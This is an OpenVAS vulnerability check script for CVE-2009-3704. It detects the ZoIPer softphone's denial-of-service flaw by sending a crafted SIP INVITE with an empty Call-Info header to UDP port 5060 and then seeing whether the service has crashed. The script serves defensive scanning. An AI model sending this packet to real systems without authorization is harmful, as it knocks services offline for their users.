###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zoiper_empty_callinfo_dos_vuln.nasl 15 2013-10-27 12:49:54Z jan $
#
# ZoIPer Empty Call-Info Denial of Service Vulnerability
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to cause the service to crash.
  Impact Level: Application";
tag_affected = "ZoIPer version prior to 2.24 (Windows) and 2.13 (Linux)";
tag_insight = "The flaw is due to an error while handling specially crafted SIP INVITE
  messages which contain an empty Call-Info header.";
tag_solution = "Upgrade to ZoIPer version 2.24 (Windows) and 2.13 (Linux) or later,
  http://www.zoiper.com/zoiper.php";
tag_summary = "This host is running ZoIPer and is prone to Denial of Service
  vulnerability.";

if(description)
{
  script_id(800963);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-10-23 16:18:41 +0200 (Fri, 23 Oct 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_cve_id("CVE-2009-3704");
  script_name("ZoIPer Empty Call-Info Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/37015");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/53792");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/0910-exploits/zoiper_dos.py.txt");

  script_description(desc);
  script_summary("Check for DoS attack on ZoIPer");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Denial of Service");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("sip.inc");

zoiperPort = 5060;
if(!get_udp_port_state(zoiperPort)){
  exit(0);
}

banner = get_sip_banner(port:zoiperPort);
if("Zoiper" >!< banner || safe_checks()){
  exit(0);
}

soc1 = open_sock_udp(zoiperPort);
if(soc1)
{
  sndReq = string("INVITE sip:openvas@10.0.0.1 SIP/2.0","\r\n",
           "Via: SIP/2.0/UDP ", get_host_name(), ".131:1298;branch=z9hG4bKJRnTggvMGl-6233","\r\n",
           "Max-Forwards: 70","\r\n",
           "From: OpenVAS <sip:OpenVAS@", get_host_name(),".131>;tag=f7mXZqgqZy-6233","\r\n",
           "To: openvas <sip:openvas@10.0.0.1>","\r\n",
           "Call-ID: wSHhHjng99-6233@", get_host_name(),".131","\r\n",
           "CSeq: 6233 INVITE","\r\n",
           "Contact: <sip:OpenVAS@", get_host_name(),".131>","\r\n",
           "Content-Type: application/sdp","\r\n",
           "Call-Info:","\r\n",
           "Content-Length: 125","\r\n\r\n");

  send(socket:soc1, data:sndReq);
  close(soc1);
  banner = get_sip_banner(port:zoiperPort);
  if(isnull(banner)){
    security_warning(port:5060, proto:"udp");
  }
}
